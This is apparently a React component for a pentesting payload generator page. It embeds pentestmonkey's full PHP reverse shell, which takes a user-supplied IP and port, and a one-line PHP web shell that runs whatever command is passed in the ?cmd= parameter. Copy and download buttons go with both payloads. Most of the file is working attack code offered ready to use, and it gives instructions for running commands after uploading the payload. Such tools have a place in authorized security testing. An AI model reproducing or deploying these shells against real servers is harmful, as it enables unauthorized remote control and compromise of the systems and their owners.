import React, { useState } from "react";
import {
  Input,
  Button,
  message,
  Typography,
  Row,
  Col,
  Divider,
  Collapse,
} from "antd";
import {
  CopyOutlined,
  WifiOutlined,
  DownloadOutlined,
  ArrowsAltOutlined,
  createFromIconfontCN,
} from "@ant-design/icons";
import QueueAnim from "rc-queue-anim";
import Clipboard from "react-clipboard.js";

const { Title, Paragraph } = Typography;
const { Panel } = Collapse;
const IconFont = createFromIconfontCN({
  scriptUrl: ["./iconfont.js"],
});

export default (props) => {
  const [values, setValues] = useState({
    ip: "",
    port: "",
  });
  const handleChange = (name) => (event) => {
    setValues({ ...values, [name]: event.target.value });
  };
  const successInfoReverseShell = () => {
    message.success("Your reverse shell has been copied");
  };
  const successInfoDownload = () => {
    message.success("Reverse shell URI encoded has been copied");
  };
  const oneLiner = `<?php system($_GET["cmd"]);?`;
  const phpReverseShell = `
  <?php
  // php-reverse-shell - A Reverse Shell implementation in PHP
  // Copyright (C) 2007 pentestmonkey@pentestmonkey.net

  set_time_limit (0);
  $VERSION = "1.0";
  $ip = '${values.ip}';  // You have changed this
  $port = ${values.port};// And this
  $chunk_size = 1400;
  $write_a = null;
  $error_a = null;
  $shell = 'uname -a; w; id; /bin/sh -i';
  $daemon = 0;
  $debug = 0;

  //
  // Daemonise ourself if possible to avoid zombies later
  //

  // pcntl_fork is hardly ever available, but will allow us to daemonise
  // our php process and avoid zombies.  Worth a try...
  if (function_exists('pcntl_fork')) {
    // Fork and have the parent process exit
    $pid = pcntl_fork();
    
    if ($pid == -1) {
      printit("ERROR: Can't fork");
      exit(1);
    }
    
    if ($pid) {
      exit(0);  // Parent exits
    }

    // Make the current process a session leader
    // Will only succeed if we forked
    if (posix_setsid() == -1) {
      printit("Error: Can't setsid()");
      exit(1);
    }

    $daemon = 1;
  } else {
    printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
  }

  // Change to a safe directory
  chdir("/");

  // Remove any umask we inherited
  umask(0);

  //
  // Do the reverse shell...
  //

  // Open reverse connection
  $sock = fsockopen($ip, $port, $errno, $errstr, 30);
  if (!$sock) {
    printit("$errstr ($errno)");
    exit(1);
  }

  // Spawn shell process
  $descriptorspec = array(
    0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
    1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
    2 => array("pipe", "w")   // stderr is a pipe that the child will write to
  );

  $process = proc_open($shell, $descriptorspec, $pipes);

  if (!is_resource($process)) {
    printit("ERROR: Can't spawn shell");
    exit(1);
  }

  // Set everything to non-blocking
  // Reason: Occsionally reads will block, even though stream_select tells us they won't
  stream_set_blocking($pipes[0], 0);
  stream_set_blocking($pipes[1], 0);
  stream_set_blocking($pipes[2], 0);
  stream_set_blocking($sock, 0);

  printit("Successfully opened reverse shell to $ip:$port");

  while (1) {
    // Check for end of TCP connection
    if (feof($sock)) {
      printit("ERROR: Shell connection terminated");
      break;
    }

    // Check for end of STDOUT
    if (feof($pipes[1])) {
      printit("ERROR: Shell process terminated");
      break;
    }

    // Wait until a command is end down $sock, or some
    // command output is available on STDOUT or STDERR
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    // If we can read from the TCP socket, send
    // data to process's STDIN
    if (in_array($sock, $read_a)) {
      if ($debug) printit("SOCK READ");
      $input = fread($sock, $chunk_size);
      if ($debug) printit("SOCK: $input");
      fwrite($pipes[0], $input);
    }

    // If we can read from the process's STDOUT
    // send data down tcp connection
    if (in_array($pipes[1], $read_a)) {
      if ($debug) printit("STDOUT READ");
      $input = fread($pipes[1], $chunk_size);
      if ($debug) printit("STDOUT: $input");
      fwrite($sock, $input);
    }

    // If we can read from the process's STDERR
    // send data down tcp connection
    if (in_array($pipes[2], $read_a)) {
      if ($debug) printit("STDERR READ");
      $input = fread($pipes[2], $chunk_size);
      if ($debug) printit("STDERR: $input");
      fwrite($sock, $input);
    }
  }

  fclose($sock);
  fclose($pipes[0]);
  fclose($pipes[1]);
  fclose($pipes[2]);
  proc_close($process);

  // Like print, but does nothing if we've daemonised ourself
  // (I can't figure out how to redirect STDOUT like a proper daemon)
  function printit ($string) {
    if (!$daemon) {
      print "$string\n";
    }
  }

  ?> 
  `;
  return (
    <QueueAnim delay={300} duration={1500}>
      <Title
        variant='Title level={3}'
        style={{ fontWeight: "bold", margin: 15 }}
      >
        PHP Reverse Shell
      </Title>
      <Paragraph style={{ margin: 15 }}>
        Some text about the reverse shell in php
      </Paragraph>
      <div style={{ padding: 15 }}>
        <Row gutter={{ xs: 8, sm: 16, md: 24, lg: 32 }}>
          <Col span={12}>
            <Input
              maxLength={15}
              prefix={<WifiOutlined />}
              name='Ip adress'
              placeholder='IP Address (ex: 212.212.111.222)'
              onChange={handleChange("ip")}
            />
          </Col>
          <Col span={12}>
            <Input
              maxLength={4}
              prefix={<IconFont type='icon-Network-Plug' />}
              name='Port'
              placeholder='Port (ex: 1337)'
              onChange={handleChange("port")}
            />
          </Col>
        </Row>
      </div>
      <Divider dashed />
      <div
        key='a'
        style={{
          padding: 15,
          marginTop: 15,
        }}
      >
        <Title>Pentestmonkey's reverse shell</Title>
        <Paragraph>
          This script will make an outbound TCP connection to a hardcoded IP and
          port.
        </Paragraph>
        <Collapse defaultActiveKey={["0"]}>
          <Panel header='You can see the source code there' key='1'>
            <p>{phpReverseShell}</p>
            <a
              href='https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php'
              alt='github_repo'
              target='_blank'
              rel='noreferrer noopener'
            >
              <Button type='dashed' style={{ marginBottom: 10, marginTop: 15 }}>
                <ArrowsAltOutlined />
                See the github repo of the author
              </Button>
            </a>
          </Panel>
        </Collapse>
        <Button
          type='primary'
          style={{ marginBottom: 10, marginTop: 15 }}
          onClick={successInfoReverseShell}
        >
          <DownloadOutlined />
          Download
        </Button>
        <Clipboard component='a' data-clipboard-text={phpReverseShell}>
          <Button
            type='dashed'
            style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
            onClick={successInfoReverseShell}
          >
            <CopyOutlined />
            Copy
          </Button>
        </Clipboard>
      </div>
      <Divider dashed />
      <div
        key='b'
        style={{
          padding: 15,
          marginTop: 15,
        }}
      >
        <Title>Basic RCE</Title>
        <Paragraph>
          When you have successfully uploaded your payload, just put your
          commands after the variable ?cmd= (ex: ?cmd=ls -la")
        </Paragraph>
        <Paragraph copyable>{oneLiner}</Paragraph>
        <Button
          type='primary'
          style={{ marginBottom: 10, marginTop: 15 }}
          onClick={successInfoReverseShell}
        >
          <DownloadOutlined />
          Download
        </Button>
        <Clipboard component='a' data-clipboard-text={oneLiner}>
          <Button
            type='dashed'
            style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
            onClick={successInfoReverseShell}
          >
            <CopyOutlined />
            Copy
          </Button>
        </Clipboard>
      </div>
      <Divider dashed />
    </QueueAnim>
  );
};
